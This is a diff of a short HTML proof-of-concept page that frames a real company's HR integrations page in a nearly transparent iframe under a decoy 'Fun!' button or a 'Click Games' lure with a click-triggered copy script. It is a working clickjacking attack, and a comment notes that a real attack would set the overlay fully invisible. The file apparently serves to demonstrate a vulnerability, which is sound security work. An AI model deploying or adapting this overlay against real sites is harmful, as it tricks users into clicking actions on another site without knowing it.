@@ -1,16 +1,26 @@
 <html>
-    <style>
-      iframe {
-          width:1000px;
-          height:500px;
-          position:absolute;
-          top:0; left:0;
-          filter:alpha(opacity=10); /* in a real attack this would be opacity=0 */
-          opacity:0.1;
-      }
-    </style>
-    <body>
-      <button style="z-index:-1;margin-top:215px;margin-left:270px;width:50px;">Fun!</button>
-      <iframe src="https://www.rippling.com/hr-integrations/" width="800" height="400"></iframe>
-    </body>
+<head><title>Poc</title></head>
+<body>
+<h1>Welcome to Click Games</h1>
+Message :<input name="searchapp" id="searchapp" type="text" placeholder="Find an app" class="ruiInput ruiInput--mini" required="evil">
+<br><br><br>
+<script>
+document.getElementById("searchapp").onclick = function(){
+this.select();
+document.execCommand('copy');
+alert("You'r Game Begins!")
+}
+</script>
+<style>
+iframe {
+width: 600px;
+height: 450px;
+position: absolute;
+top: 0; right: 10;
+filter: alpha(opacity=50);
+opacity: 0.1;
+}
+</style>
+<iframe src="https://www.rippling.com/hr-integrations/"></iframe>
+</body>
 </html>
